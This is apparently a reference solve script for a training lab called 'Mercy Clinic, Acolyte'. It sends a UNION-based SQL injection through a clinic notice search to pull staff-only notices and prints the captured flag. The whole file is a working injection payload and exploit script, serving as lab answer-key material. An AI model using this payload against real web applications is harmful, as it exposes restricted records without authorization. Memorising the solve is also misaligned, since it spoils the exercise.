// Reference solve — Mercy Clinic, Acolyte. The notice search concatenates q into a LIKE string literal over the PUBLIC
// notices. INJECTION closes that string literal, balances the open group paren, and UNION-selects the staff notice's
// (id, title, body) so its body — the flag — renders in the results. The three result columns are id, title, body, so
// the UNION lines up with them; `-- ` comments out the query's tail. labs:test proves this prints the flag.
const base = process.argv[2];
const INJECTION = "') UNION SELECT id, title, body FROM notices WHERE visibility='staff' -- ";
const res = await fetch(`${base}/search?q=${encodeURIComponent(INJECTION)}`);
const html = await res.text();
const m = html.match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
